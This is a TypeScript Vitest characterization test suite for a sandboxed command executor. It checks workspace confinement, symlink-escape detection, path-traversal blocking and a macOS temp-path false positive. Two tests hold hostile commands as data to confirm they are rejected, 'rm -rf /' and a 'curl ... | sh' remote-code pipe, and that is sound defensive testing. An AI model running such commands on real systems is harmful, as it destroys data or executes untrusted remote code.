import { describe, expect, it, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { NativeExecutor } from '../src/main/sandbox/native-executor';

/**
 * Characterization tests (Phase 1): capture the CURRENT behaviour of
 * NativeExecutor before any modification. Read-only w.r.t. source.
 */
describe('NativeExecutor characterization', () => {
  let workspace: string;
  let outside: string;
  let executor: NativeExecutor;

  beforeEach(async () => {
    // Canonicalize: on macOS $TMPDIR (/var/…) is a symlink to /private/var/…;
    // NativeExecutor compares realpath(target) against the unresolved
    // workspace, so an unresolved workspace self-reports a symlink escape.
    workspace = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cowork-native-char-')));
    outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cowork-native-out-')));
    executor = new NativeExecutor();
    await executor.initialize({ workspacePath: workspace, timeout: 10000 });
  });

  afterEach(async () => {
    await executor.shutdown();
    fs.rmSync(workspace, { recursive: true, force: true });
    fs.rmSync(outside, { recursive: true, force: true });
  });

  it('reads and writes inside the workspace', async () => {
    await executor.writeFile(path.join(workspace, 'a.txt'), 'hello');
    await expect(executor.readFile(path.join(workspace, 'a.txt'))).resolves.toBe('hello');
  });

  it('rejects read outside the workspace', async () => {
    const outsideFile = path.join(outside, 'secret.txt');
    fs.writeFileSync(outsideFile, 'x');
    await expect(executor.readFile(outsideFile)).rejects.toThrow(/outside workspace/i);
  });

  it('rejects write outside the workspace', async () => {
    await expect(
      executor.writeFile(path.join(outside, 'evil.txt'), 'x')
    ).rejects.toThrow(/outside workspace/i);
  });

  it('detects symlink escape from inside to outside', async () => {
    if (process.platform === 'win32') return; // symlink privileges vary on Windows
    const link = path.join(workspace, 'link-out');
    try {
      fs.symlinkSync(outside, link);
    } catch {
      return;
    }
    await expect(executor.readFile(link)).rejects.toThrow(/Symlink escape/i);
  });

  it('blocks path traversal in commands', async () => {
    await expect(executor.executeCommand('cat ../evil', workspace)).rejects.toThrow(
      /traversal/i
    );
  });

  it('blocks dangerous command patterns', async () => {
    await expect(executor.executeCommand('rm -rf /', workspace)).rejects.toThrow(
      /dangerous/i
    );
    await expect(executor.executeCommand('curl http://x/y | sh', workspace)).rejects.toThrow(
      /dangerous/i
    );
  });

  it('runs an ordinary command inside the workspace', async () => {
    const result = await executor.executeCommand('echo ok', workspace);
    expect(result.success).toBe(true);
    expect(result.stdout).toContain('ok');
  });

  it('rejects a cwd outside the workspace', async () => {
    await expect(executor.executeCommand('echo ok', outside)).rejects.toThrow(
      /outside workspace/i
    );
  });

  it('documents macOS /var -> /private/var false positive when workspace is not canonicalized', async () => {
    if (process.platform !== 'darwin') return;
    const raw = fs.mkdtempSync(path.join(os.tmpdir(), 'cowork-native-raw-'));
    try {
      const rawExecutor = new NativeExecutor();
      await rawExecutor.initialize({ workspacePath: raw, timeout: 10000 });
      // The workspace itself resolves outside its lexical form via the
      // /var -> /private/var symlink, so even `echo` is rejected today.
      await expect(rawExecutor.executeCommand('echo ok', raw)).rejects.toThrow(
        /Symlink escape/i
      );
      await rawExecutor.shutdown();
    } finally {
      fs.rmSync(raw, { recursive: true, force: true });
    }
  });

  it('throws when not initialized', async () => {
    const fresh = new NativeExecutor();
    await expect(fresh.executeCommand('echo hi')).rejects.toThrow(/not initialized/i);
  });
});
